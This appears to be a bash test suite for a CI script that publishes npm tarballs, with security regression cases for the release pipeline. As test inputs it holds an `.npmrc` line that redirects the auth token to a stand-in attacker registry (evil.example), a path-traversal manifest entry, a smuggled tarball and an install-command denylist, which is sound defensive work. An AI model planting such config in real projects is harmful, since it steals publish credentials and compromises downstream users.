#!/usr/bin/env bash
# Exercises tools/ci/publish-packed-tarballs.sh against a stub `npm`, with no registry and no
# token. That script is the only step in the release pipeline that holds a publish credential,
# and it runs for real perhaps once a release — far too rare a feedback loop to find a
# regression in. Its reject cases matter as much as its accept case: publishing in the wrong
# ORDER, or publishing a tarball nobody declared, are both green-looking failures at the one
# point in the pipeline that cannot be undone (`npm publish` has no re-push).
set -uo pipefail

SCRIPT="${1:-$(cd "$(dirname "$0")" && pwd)/publish-packed-tarballs.sh}"
[ -x "$SCRIPT" ] || { echo "FAIL: $SCRIPT is not executable"; exit 1; }

PASS=0
FAIL=0

check() { # name expected actual
    if [ "$2" = "$3" ]; then
        PASS=$((PASS + 1)); echo "ok   — $1"
    else
        FAIL=$((FAIL + 1)); echo "FAIL — $1 (expected '$2', got '$3')"
    fi
}

STUB_DIR="$(mktemp -d)"
WORK_ROOT="$(mktemp -d)"
trap 'rm -rf "$STUB_DIR" "$WORK_ROOT"' EXIT
mkdir -p "$STUB_DIR/bin"

# `npm prefix` walks up for a package.json or a node_modules exactly as npm's own localPrefix
# resolution does, so the guard in the script under test is exercised for real rather than
# against a stub that always agrees with it. `npm publish` appends its argv to PUBLISH_LOG,
# which is what the order assertions read.
cat > "$STUB_DIR/bin/npm" <<'STUB'
#!/usr/bin/env bash
case "$1" in
    prefix)
        dir="$PWD"
        while [ "$dir" != "/" ]; do
            if [ -e "$dir/package.json" ] || [ -e "$dir/node_modules" ]; then
                echo "$dir"; exit 0
            fi
            dir="$(dirname "$dir")"
        done
        echo "$PWD"
        ;;
    publish)
        shift
        echo "$*" >> "$PUBLISH_LOG"
        if [ -n "${FAKE_PUBLISH_FAILS:-}" ]; then
            echo 'stub-npm: publish failed' >&2; exit 1
        fi
        ;;
    *)
        echo "stub-npm: unexpected command: $*" >&2; exit 1
        ;;
esac
STUB
chmod +x "$STUB_DIR/bin/npm"
export PATH="$STUB_DIR/bin:$PATH"

# A fresh tarball directory with the given manifest lines, each also created as a real file
# unless the name is prefixed with `!` (declared-but-absent).
new_case() { # case-name manifest-line...
    local dir="$WORK_ROOT/$1"
    shift
    mkdir -p "$dir"
    : > "$dir/publish-order.txt"
    local line
    for line in "$@"; do
        if [ "${line#!}" != "$line" ]; then
            echo "${line#!}" >> "$dir/publish-order.txt"
        else
            echo "$line" >> "$dir/publish-order.txt"
            echo 'tarball' > "$dir/$line"
        fi
    done
    echo "$dir"
}

run_case() { # dir
    PUBLISH_LOG="$WORK_ROOT/publish.log"
    export PUBLISH_LOG
    : > "$PUBLISH_LOG"
    "$SCRIPT" "$1" > "$WORK_ROOT/out.log" 2>&1
}

# --- the accept case, and the property the split put at risk -------------------------------
dir="$(new_case happy aiqadam-shared-0.135.0.tgz aiqadam-qadams-framework-0.32.1.tgz aiqadam-qadams-common-0.14.1.tgz)"
run_case "$dir"
check "publishes three tarballs successfully" 0 $?
check "publishes in manifest order, not alphabetical" \
    "shared framework common" \
    "$(sed -E 's#^\./aiqadam-(qadams-)?([a-z]+)-[0-9].*#\2#' "$WORK_ROOT/publish.log" | tr '\n' ' ' | sed 's/ $//')"
check "passes the flags provenance needs" \
    "3" \
    "$(grep -c -- '--access public --tag latest --provenance' "$WORK_ROOT/publish.log")"

# Alphabetical order would be common, framework, shared — assert the fixture could actually
# have caught that, so the assertion above is not vacuous.
check "the fixture's alphabetical order really does differ from its manifest order" \
    "aiqadam-qadams-common-0.14.1.tgz" \
    "$(cd "$dir" && ls ./*.tgz | head -1 | xargs basename)"

# --- empty is success, absent is not -------------------------------------------------------
dir="$(new_case empty)"
run_case "$dir"
check "an empty manifest is a green no-op" 0 $?
check "and publishes nothing" "0" "$(wc -l < "$WORK_ROOT/publish.log" | tr -d ' ')"

dir="$(new_case missing-manifest aiqadam-shared-0.135.0.tgz)"
rm "$dir/publish-order.txt"
run_case "$dir"
check "a missing manifest fails rather than publishing nothing quietly" 1 $?

# --- the reject cases ----------------------------------------------------------------------
dir="$(new_case declared-absent '!aiqadam-shared-0.135.0.tgz')"
run_case "$dir"
check "a manifest entry with no file fails" 1 $?

dir="$(new_case undeclared-present aiqadam-shared-0.135.0.tgz)"
echo 'tarball' > "$dir/aiqadam-smuggled-9.9.9.tgz"
run_case "$dir"
check "a tarball the manifest does not name fails" 1 $?
check "and nothing was published before the refusal" "0" "$(wc -l < "$WORK_ROOT/publish.log" | tr -d ' ')"

# The target is created deliberately: with it absent the existence check refuses the entry
# first, and this case passes with the separator guard deleted — verified by mutation, which is
# how it was caught. Only a resolvable path leaves the guard as the sole thing that can refuse.
dir="$(new_case traversal '!../outside.tgz')"
echo 'tarball' > "$WORK_ROOT/outside.tgz"
run_case "$dir"
check "a manifest entry containing a path separator fails" 1 $?
check "and nothing was published before that refusal" "0" "$(wc -l < "$WORK_ROOT/publish.log" | tr -d ' ')"

# npm falls back to the cwd for localPrefix when the walk up finds nothing, so a config file
# planted in the tarball directory ITSELF is read as project config while `npm prefix` still
# answers that directory and the prefix guard passes. app-sec demonstrated the consequence: an
# .npmrc carrying `//evil.example/:_authToken=${NODE_AUTH_TOKEN}` sends the token to the
# attacker's registry, with every guard green. The directory sweep is what closes it, so these
# two cases are the ones that must fail if the sweep is ever narrowed back to `*.tgz`.
dir="$(new_case planted-npmrc aiqadam-shared-0.135.0.tgz)"
printf 'registry=https://evil.example/\n' > "$dir/.npmrc"
run_case "$dir"
check "an .npmrc planted in the tarball directory fails" 1 $?
check "and the token never reaches a publish" "0" "$(wc -l < "$WORK_ROOT/publish.log" | tr -d ' ')"

# A pack run that used --skip-registry-check drops this marker (see SKIP_REGISTRY_CHECK_MARKER in
# tools/scripts/utils/publish-npm-package.ts). Those tarballs were built with the already-published
# and version-bump guards disabled and must never reach the registry. Nothing here knows the name:
# the undeclared-entry sweep refuses it because the manifest does not name it, which is precisely
# the coupling this case exists to pin — narrow that sweep and this goes red.
dir="$(new_case skip-registry-check-marker aiqadam-shared-0.135.0.tgz)"
printf 'packed with the guards off\n' > "$dir/PACKED-WITH-SKIP-REGISTRY-CHECK"
run_case "$dir"
check "a directory marked as packed with --skip-registry-check is refused" 1 $?
check "and nothing from it is published" "0" "$(wc -l < "$WORK_ROOT/publish.log" | tr -d ' ')"

dir="$(new_case planted-package-json aiqadam-shared-0.135.0.tgz)"
echo '{"name":"smuggled"}' > "$dir/package.json"
run_case "$dir"
check "a package.json planted in the tarball directory fails" 1 $?

dir="$(new_case project-config aiqadam-shared-0.135.0.tgz)"
# The package.json goes in a parent of its OWN case directory, never in $WORK_ROOT: one placed
# there would sit above every later case too, and each would fail this guard before reaching a
# publish — silently turning the rest of the suite into assertions about the wrong refusal.
mkdir -p "$WORK_ROOT/project-config-parent/tarballs"
echo '{"name":"repo"}' > "$WORK_ROOT/project-config-parent/package.json"
cp "$dir/publish-order.txt" "$WORK_ROOT/project-config-parent/tarballs/"
cp "$dir/aiqadam-shared-0.135.0.tgz" "$WORK_ROOT/project-config-parent/tarballs/"
run_case "$WORK_ROOT/project-config-parent/tarballs"
check "a package.json above the tarballs fails — project .npmrc would outrank the auth config" 1 $?

# --- a failed publish must stop, not continue down the manifest ----------------------------
dir="$(new_case publish-fails aiqadam-shared-0.135.0.tgz aiqadam-qadams-framework-0.32.1.tgz)"
FAKE_PUBLISH_FAILS=1 run_case "$dir"
check "a failing publish exits non-zero" 1 $?
check "and does not continue to the next package" "1" "$(wc -l < "$WORK_ROOT/publish.log" | tr -d ' ')"

# --- the dist-tag is honoured --------------------------------------------------------------
dir="$(new_case dist-tag aiqadam-shared-0.135.0.tgz)"
NPM_DIST_TAG=next run_case "$dir"
check "NPM_DIST_TAG is honoured" "1" "$(grep -c -- '--tag next' "$WORK_ROOT/publish.log")"

# The manifest filename exists as a literal in both a TypeScript producer and a shell consumer,
# which cannot import from each other. Nothing else would notice them drifting apart.
REPO_ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
ts_name="$(sed -n "s/^const PUBLISH_ORDER_FILENAME = '\\(.*\\)'.*/\\1/p" "$REPO_ROOT/tools/scripts/publish-framework-packages.ts")"
ts_marker="$(sed -n "s/^const SKIP_REGISTRY_CHECK_MARKER = '\\(.*\\)'.*/\\1/p" "$REPO_ROOT/tools/scripts/utils/publish-npm-package.ts")"
check "the marker fixture above uses the name the producer actually writes" "PACKED-WITH-SKIP-REGISTRY-CHECK" "$ts_marker"

# The marker only reaches the publishing job because the packing job uploads the pack
# directory whole. An enumerated `path:` would drop it and silently undo the protection above,
# with this suite still green — so the shape of that one line is pinned here rather than left
# to a comment. Anchored on the step name, not on `name: npm-framework-packages`, which the
# DOWNLOAD step carries too — the looser range swept in a third, unrelated `path:` and the
# check failed on its own extraction rather than on the property.
#
# The file has moved twice: out of release.yml in #496, then again in #498 when the PUBLISHING
# job went back into each caller and only packing stayed reusable. Pinning the wrong file would
# pin one with no upload step in it — and `sed` over a file with no match prints nothing, which
# is the failure mode this suite's own docs warn about. The existence check and the
# exactly-one-line check below are what turn that into a red test rather than a vacuous pass.
WORKFLOW="$REPO_ROOT/.github/workflows/_pack-framework-packages.yml"
[ -f "$WORKFLOW" ] || { echo "FAIL: $WORKFLOW does not exist"; exit 1; }
upload_block="$(sed -n '/- name: Upload the packed tarballs/,/retention-days/p' "$WORKFLOW")"
upload_path="$(printf '%s\n' "$upload_block" | sed -n 's/^ *path: //p')"
upload_path_count="$(printf '%s\n' "$upload_path" | grep -c . || true)"
check "exactly one path: line was read out of the upload step" "1" "$upload_path_count"
check "the packing job uploads the pack directory whole, so the marker is in the artifact" \
    "\${{ runner.temp }}/npm-packages" "$upload_path"
case "$ts_marker" in
  .*) check "the marker is not a dotfile (upload-artifact drops those)" "not-a-dotfile" "dotfile" ;;
  *)  check "the marker is not a dotfile (upload-artifact drops those)" "not-a-dotfile" "not-a-dotfile" ;;
esac
sh_name="$(sed -n 's/^PUBLISH_ORDER_FILENAME="\(.*\)"$/\1/p' "$REPO_ROOT/tools/ci/publish-packed-tarballs.sh")"
check "the producer and the consumer agree on the manifest filename" "$ts_name" "$sh_name"
check "and that name is not empty (so the check above is not vacuous)" "publish-order.txt" "$ts_name"

# The publishing job is duplicated in release.yml and publish-packages.yml on purpose (#498):
# `environment:` only resolves its secrets in a job that lives in the workflow the event
# triggered, so it cannot move into the reusable packing workflow, and passing the token down
# instead would force it to repository scope where every workflow can read it. Duplication
# chosen deliberately still drifts, and the half that drifts silently is the one nobody runs
# until a release — so the two copies are pinned equal here, comments excluded because each
# carries its own lead paragraph.
# Both halves of the terminator were found by review, each by executing an attack rather than
# by reading:
#
#   /^[^[:space:]]/      a COLUMN-0 key. Without it nothing stopped the scan at a top-level
#                        block, so appending one after the last job in publish-packages.yml
#                        (where this job is last and awk otherwise runs to EOF) made the two
#                        extractions differ while the jobs were identical — a failure on the
#                        wrong property, the same self-inflicted class the upload-path check
#                        above already suffered once.
#   /^  [^[:space:]#]/   the next JOB key, and deliberately not a two-space COMMENT. With a
#                        bare `[^ ]` the scan stopped at the first such comment inside the job
#                        body: one comment line added to both files, plus an exfiltrating
#                        `run:` below it in both, and every assertion here stayed green.
#
# The trailing greps drop comments and blanks, so over-capturing the comment block that
# precedes the next job key costs nothing.
extract_publish_job() {
    awk '
        /^  publish-framework-packages:$/                  { inside = 1; print; next }
        inside && (/^[^[:space:]]/ || /^  [^[:space:]#]/)  { inside = 0 }
        inside                                             { print }
    ' "$1" | grep -vE '^[[:space:]]*#' | grep -vE '^[[:space:]]*$'
}
release_job="$(extract_publish_job "$REPO_ROOT/.github/workflows/release.yml")"
dispatch_job="$(extract_publish_job "$REPO_ROOT/.github/workflows/publish-packages.yml")"
release_job_lines="$(printf '%s\n' "$release_job" | grep -c . || true)"
check "the publishing job was actually found in release.yml (guards a vacuous compare below)" \
    "yes" "$([ "$release_job_lines" -gt 20 ] && echo yes || echo "no: only $release_job_lines lines")"
if [ "$release_job" = "$dispatch_job" ]; then
    check "release.yml and publish-packages.yml carry the same publishing job" "identical" "identical"
else
    printf 'publishing job drift:\n%s\n' "$(diff <(printf '%s\n' "$release_job") <(printf '%s\n' "$dispatch_job") || true)"
    check "release.yml and publish-packages.yml carry the same publishing job" "identical" "they differ"
fi

# Equality alone is only a drift detector: an edit applied IDENTICALLY to both copies passes
# it. The properties below are the ones #486 bought, asserted positively on each copy so that
# symmetric damage is caught too. Review's phrasing, worth keeping: the difference between a
# drift detector and a control.
for wf in release.yml publish-packages.yml; do
    job="$(extract_publish_job "$REPO_ROOT/.github/workflows/$wf")"

    # The environment is what makes the secret resolve at all and what summons the required
    # reviewer. Deleting it is the single edit that would silently turn the publish into an
    # unreviewed one.
    check "$wf's publishing job still declares the npm-publish environment" "npm-publish" \
        "$(printf '%s\n' "$job" | sed -n 's/^    environment: //p')"

    # The anchor: without it, a copy whose final step was replaced in BOTH files still looks
    # identical and still has an environment.
    check "$wf's publishing job still runs the shared publisher script" "yes" \
        "$(printf '%s\n' "$job" | grep -qF 'tools/ci/publish-packed-tarballs.sh "${{ runner.temp }}/npm-packages"' && echo yes || echo no)"

    # `contains` alone would pass a token-reading step APPENDED after the publish, so the
    # publisher must also be the last step. Count step headers after it rather than pinning the
    # job's last text line: `run:` before `env:` is an equally common key order and a `run: |`
    # block may have more than one line, and neither is a reason to redden every PR in the repo
    # (this suite gates _verify.yml, which ci.yml, release.yml and publish-packages.yml all call).
    check "$wf's publishing job runs no step after the shared publisher script" "0" \
        "$(printf '%s\n' "$job" | sed -n '\#tools/ci/publish-packed-tarballs.sh#,$p' | grep -cE '^      - (name|uses):' || true)"

    # #486: the job holding the token installs nothing and resolves no binary out of
    # node_modules/.bin. A build step appearing here is the regression that split bought.
    # Spell the package managers out as a matrix rather than listing the two or three
    # invocations that happen to be on the mind of whoever last edited this: the previous
    # version named `bun install`, `npm ci` and `bunx` but not `npm install` or `bun x`, which
    # is the plainest spelling of the very property the assertion is named for.
    check "$wf's publishing job installs nothing and runs no npx" "clean" \
        "$(printf '%s\n' "$job" | grep -qE 'install-deps\.sh|node_modules/\.bin|corepack|(npm|pnpm|yarn|bun)[[:space:]]+(install|i|ci|add|exec|dlx|x)([[:space:]]|$)|(npx|bunx|turbo)([[:space:]]|$)|(pip3?|apt-get|apk)[[:space:]]+(install|add)([[:space:]]|$)' && echo "found an install or npx" || echo clean)"

    # A text scan over `run:` cannot see an install that arrives as a composite action, so the
    # set of actions is an allowlist rather than a denylist. Versions are stripped: a bump to
    # actions/checkout is routine and must not redden this, a fourth action must. Strip the
    # version with a second expression rather than requiring an `@` in the match — a local
    # action (`./.github/actions/install-deps`) carries no version, and a pattern that only
    # matched `<name>@<ref>` dropped exactly that case out of the set instead of flagging it.
    check "$wf's publishing job uses only the three expected actions" \
        "actions/checkout actions/download-artifact actions/setup-node" \
        "$(printf '%s\n' "$job" | sed -n 's/^      - uses: //p' | sed 's/@.*//' | sort -u | tr '\n' ' ' | sed 's/ $//')"

    # A job holding an npm publish token has no business also holding a git one.
    check "$wf's publishing job checks out without git credentials" "yes" \
        "$(printf '%s\n' "$job" | grep -qF 'persist-credentials: false' && echo yes || echo no)"

    # --provenance cannot mint an attestation without it.
    check "$wf's publishing job still requests the OIDC token for --provenance" "yes" \
        "$(printf '%s\n' "$job" | grep -qE '^      id-token: write$' && echo yes || echo no)"
done

echo ""
echo "=== Results ==="
echo "Passed: $PASS"
echo "Failed: $FAIL"
[ "$FAIL" -eq 0 ]
